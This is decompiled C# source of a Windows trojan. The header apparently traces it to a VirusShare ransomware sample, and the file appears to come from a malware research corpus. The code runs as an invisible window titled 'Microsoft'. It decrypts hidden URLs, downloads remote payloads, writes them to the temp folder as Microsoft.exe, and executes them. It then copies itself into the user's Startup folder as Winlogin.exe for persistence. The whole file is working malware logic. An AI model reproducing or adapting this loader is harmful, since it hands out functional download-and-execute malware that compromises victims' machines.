// Decompiled with JetBrains decompiler
// Type: Lounge.Form1
// Assembly: Lounge, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 780ECBF2-72A2-4A2A-B730-2C0771A838DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Foreign.mxla-cfdc9b9ea13cd06b176ceb54e48acf41842c6cd2c44ea64deb4bec6459b9a549.exe

using Lounge.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Lounge
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    private string cfile;
    private string cbind;
    private string encryption;
    private string startup;
    private string checkbind;
    private string something;
    private string filesplitter;
    private string[] Drop;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.something = System.IO.File.ReadAllText(Application.ExecutablePath);
      this.filesplitter = "FileSplitter";
      this.Drop = Strings.Split(this.something, this.filesplitter);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "Microsoft";
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Hide();
      this.Opacity = 0.0;
      new Thread(new ThreadStart(this.start)).Start();
    }

    public void start()
    {
      this.encryption = this.Drop[1];
      this.cfile = this.AES_Decrypt(this.Drop[2], this.encryption);
      this.cbind = this.AES_Decrypt(this.Drop[3], this.encryption);
      this.startup = this.Drop[4];
      this.checkbind = this.Drop[5];
      byte[] bytes1 = Convert.FromBase64String(Form1.DecompressString(Form1.readweb(this.cfile)));
      string str1 = Path.GetTempPath() + "Microsoft.exe";
      System.IO.File.WriteAllBytes(str1, bytes1);
      Process.Start(str1);
      if (Conversions.ToBoolean(this.checkbind))
      {
        byte[] bytes2 = Convert.FromBase64String(Form1.DecompressString(Form1.readweb(this.cbind)));
        string str2 = Path.GetTempPath() + "Microsoft2.exe";
        System.IO.File.WriteAllBytes(str2, bytes2);
        Process.Start(str2);
      }
      System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
      timer.Interval = 200;
      timer.Tick += new EventHandler(this.Persistence);
      timer.Start();
    }

    public static string DecompressString(string compressedText)
    {
      try
      {
        byte[] buffer = Convert.FromBase64String(compressedText);
        using (MemoryStream memoryStream = new MemoryStream())
        {
          int int32 = BitConverter.ToInt32(buffer, 0);
          memoryStream.Write(buffer, 4, checked (buffer.Length - 4));
          byte[] numArray = new byte[checked (int32 - 1 + 1)];
          memoryStream.Position = 0L;
          using (GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
            gzipStream.Read(numArray, 0, numArray.Length);
          return Encoding.UTF8.GetString(numArray);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (string) null;
    }

    private static string readweb(string url)
    {
      try
      {
        return new StreamReader(new WebClient().OpenRead(url)).ReadToEnd();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (string) null;
    }

    public string DES_Decrypt(string input, string pass)
    {
      DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      string str;
      try
      {
        byte[] destinationArray = new byte[8];
        Array.Copy((Array) cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(pass)), 0, (Array) destinationArray, 0, 8);
        cryptoServiceProvider1.Key = destinationArray;
        cryptoServiceProvider1.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(input);
        str = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string AES_Decrypt(string input, string pass)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      string str;
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(input);
        str = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void Persistence(object sender, EventArgs e)
    {
      if (MyProject.Computer.Info.OSFullName.Contains("XP"))
      {
        try
        {
          if (!Directory.Exists("C:\\users\\" + Environment.UserName + "\\Start Menu\\Programs\\Startup\\Winlogin.exe"))
            Directory.CreateDirectory("C:\\users\\" + Environment.UserName + "\\Start Menu\\Programs\\Startup\\");
          if (System.IO.File.Exists("C:\\users\\" + Environment.UserName + "\\Start Menu\\Programs\\Startup\\Winlogin.exe"))
            return;
          FileSystem.FileCopy(Application.ExecutablePath, "C:\\users\\" + Environment.UserName + "\\Start Menu\\Programs\\Startup\\Winlogin.exe");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        try
        {
          if (!Directory.Exists("C:\\users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Winlogin.exe"))
            Directory.CreateDirectory("C:\\users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
          if (System.IO.File.Exists("C:\\users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Winlogin.exe"))
            return;
          FileSystem.FileCopy(Application.ExecutablePath, "C:\\users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Winlogin.exe");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
